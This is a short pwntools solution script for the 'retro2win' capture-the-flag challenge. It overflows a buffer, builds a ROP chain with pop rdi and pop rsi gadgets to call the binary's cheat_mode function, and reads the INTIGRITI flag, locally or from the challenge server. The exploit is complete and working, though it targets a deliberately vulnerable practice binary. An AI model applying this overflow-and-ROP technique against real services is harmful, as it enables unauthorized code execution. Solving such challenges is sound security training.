#!/usr/bin/env python3

from pwn import *
import re

EXE = ELF("./retro2win")
rop = ROP(EXE)

print(EXE.path)
if args.REMOTE:
    r = remote("retro2win.ctf.intigriti.io", 1338)
elif args.GDB:
    r = gdb.debug(EXE.path, "b main")
else:
    r = process(EXE.path)

pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
pop_rsi = rop.find_gadget(["pop rsi", "pop r15", "ret"])[0]
rdi_val = 0x2323232323232323
rsi_val = 0x4242424242424242
r15_val = 0x0

payload = b"A" * 24 + p64(pop_rdi) + p64(rdi_val) + p64(pop_rsi) + \
    p64(rsi_val) + p64(r15_val) + p64(EXE.symbols["cheat_mode"])

r.recvuntil(b"Select an option:")
r.sendline(b"1337")

log.info(f"Sending cheat option")

r.recvuntil(b"Enter your cheatcode:")
r.sendline(payload)

log.info(f"Sending payload")

data = r.recvuntil(b"}")
data = re.findall(b"INTIGRITI{.*}", data)[0]

log.success(f"Flag: {data.decode()}")
